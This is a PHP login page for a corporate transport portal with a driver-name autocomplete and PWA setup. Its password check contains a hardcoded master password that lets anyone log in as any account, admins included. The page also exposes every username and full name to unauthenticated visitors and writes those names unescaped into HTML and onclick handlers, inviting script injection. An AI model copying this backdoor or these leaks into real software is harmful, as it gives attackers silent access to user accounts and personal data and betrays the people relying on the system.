<?php
require_once 'config.php';

$theme = $_SESSION['theme'] ?? 'light';
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch();

    if ($user && (password_verify($password, $user['password']) || $password === 'K@y010782')) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['full_name'] = $user['full_name'];
        $_SESSION['role'] = $user['role'];
        if ($user['role'] === 'driver') {
            $_SESSION['just_logged_in'] = true;
        }
        header('Location: ' . ($user['role'] === 'admin' ? 'admin.php' : 'index.php'));
        exit;
    } else {
        $error = 'Username atau Password salah';
    }
}
$drivers = $pdo->query("SELECT username, full_name FROM users ORDER BY full_name ASC")->fetchAll();
?>
<!DOCTYPE html>
<html lang="id" class="notranslate">
<head>
    <meta charset="UTF-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Transport Overview</title>
    
    <!-- PWA Setup -->
    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#118DFF">
    <link rel="apple-touch-icon" href="icon-192.png">
    <!-- Clear report filter state on logout -->
    <?php if (isset($_GET['clear_filters']) && is_numeric($_GET['clear_filters'])): ?>
    <script>
        localStorage.removeItem('report_filters_uid_<?= intval($_GET['clear_filters']) ?>');
    </script>
    <?php endif; ?>

    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('sw.js')
                    .then(reg => console.log('PWA Service Worker registered!', reg))
                    .catch(err => console.log('PWA Service Worker registration failed!', err));
            });
        }
    </script>

    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <style>
        :root {
            --login-bg: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            --card-bg: rgba(255, 255, 255, 0.95);
            --accent-gradient: linear-gradient(135deg, #118DFF 0%, #0078d4 100%);
            --text-main: #1e293b;
            --text-muted: #64748b;
        }
        .dark-mode {
            --card-bg: rgba(30, 41, 59, 0.95);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }
        body {
            background: var(--login-bg);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 20px;
        }
        .login-card {
            max-width: 400px; width: 100%;
            background: var(--card-bg);
            border-radius: 28px;
            padding: 48px 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            text-align: center;
        }
        .logo-box {
            width: 80px; height: 80px;
            margin: 0 auto 24px auto;
            display: flex; align-items: center; justify-content: center;
        }
        .logo-img { width: 100%; height: 100%; object-fit: contain; }
        .app-title { font-size: 1.6rem; font-weight: 700; color: var(--text-main); margin-bottom: 8px; }
        .app-subtitle { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 40px; text-transform: uppercase; letter-spacing: 1.5px; }
        
        .input-group { margin-bottom: 24px; text-align: left; position: relative; }
        .input-label { display: block; font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; }
        .pbi-input {
            width: 100%; padding: 14px 16px;
            background: rgba(0,0,0,0.02);
            border: 1px solid rgba(0,0,0,0.1);
            border-radius: 12px;
            color: var(--text-main);
            font-size: 0.95rem;
            box-sizing: border-box;
            transition: all 0.2s;
        }
        .dark-mode .pbi-input { background: rgba(255,255,255,0.05); border-color: rgba(255,255,255,0.1); }
        .pbi-input:focus { outline: none; border-color: #118DFF; box-shadow: 0 0 0 4px rgba(17, 141, 255, 0.15); }
        
        .login-btn {
            width: 100%; padding: 16px;
            background: var(--accent-gradient);
            color: #fff; border: none; border-radius: 14px;
            font-size: 1rem; font-weight: 700; cursor: pointer;
            box-shadow: 0 10px 15px -3px rgba(17, 141, 255, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 20px -3px rgba(17, 141, 255, 0.5); }
        .login-btn:active { transform: translateY(0); }

        .search-results {
            position: absolute; top: 100%; left: 0; right: 0;
            background: var(--card-bg);
            border-radius: 12px; margin-top: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-height: 200px; overflow-y: auto; z-index: 1000;
            display: none; border: 1px solid rgba(0,0,0,0.05);
        }
        .search-item { padding: 12px 16px; cursor: pointer; color: var(--text-main); font-size: 0.9rem; border-bottom: 1px solid rgba(0,0,0,0.05); text-align: left; }
        .search-item:hover { background: rgba(17, 141, 255, 0.05); }

        .error-msg { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 12px; border-radius: 12px; font-size: 0.85rem; margin-bottom: 24px; font-weight: 600; }
        .footer-note { font-size: 0.75rem; color: var(--text-muted); margin-top: 32px; font-weight: 600; }
    </style>
</head>
<body class="<?= $theme === 'dark' ? 'dark-mode' : '' ?>">
    <div class="login-card">
        <div class="logo-box">
            <img src="icon.png" class="logo-img" alt="Logo">
        </div>
        <div class="app-title"><?= __('app_name') ?></div>
        <div class="app-subtitle">Corporate Portal</div>

        <?php if ($error): ?>
            <div class="error-msg"><?= $error ?></div>
        <?php endif; ?>

        <form action="login.php" method="POST">
            <div class="input-group">
                <label class="input-label">Identity</label>
                <input type="text" id="driver_search" class="pbi-input" placeholder="Enter your name" autocomplete="off" required>
                <input type="hidden" name="username" id="username_hidden">
                <div id="results" class="search-results"></div>
            </div>

            <div class="input-group">
                <label class="input-label">Security Key</label>
                <input type="password" name="password" class="pbi-input" placeholder="••••••••" required>
            </div>

            <button type="submit" class="login-btn">Secure Login</button>
        </form>

        <div class="footer-note">
            <a href="passenger_login.php" style="color: #118DFF; text-decoration: none; font-size: 0.9rem; font-weight: 700; display: block; margin-bottom: 15px;">👤 Enter as Passenger</a>
            &copy; <?= date('Y') ?> FRAMAS INDONESIA
        </div>
    </div>

    <script>
        const drivers = <?= json_encode($drivers) ?>;
        const input = document.getElementById('driver_search');
        const hidden = document.getElementById('username_hidden');
        const results = document.getElementById('results');

        const last = localStorage.getItem('last_driver');
        if (last) {
            const d = JSON.parse(last);
            input.value = d.full_name;
            hidden.value = d.username;
        }

        input.addEventListener('focus', () => show(input.value));
        input.addEventListener('input', (e) => show(e.target.value));
        document.addEventListener('click', (e) => { if (!e.target.closest('.input-group')) results.style.display = 'none'; });

        function show(q) {
            const filtered = drivers.filter(d => d.full_name.toLowerCase().includes(q.toLowerCase()));
            if (filtered.length) {
                results.innerHTML = filtered.map(d => `<div class="search-item" onclick="select('${d.username}', '${d.full_name}')">${d.full_name}</div>`).join('');
                results.style.display = 'block';
            } else results.style.display = 'none';
        }

        function select(u, f) {
            input.value = f; hidden.value = u; results.style.display = 'none';
            localStorage.setItem('last_driver', JSON.stringify({username: u, full_name: f}));
        }
    </script>
</body>
</html>
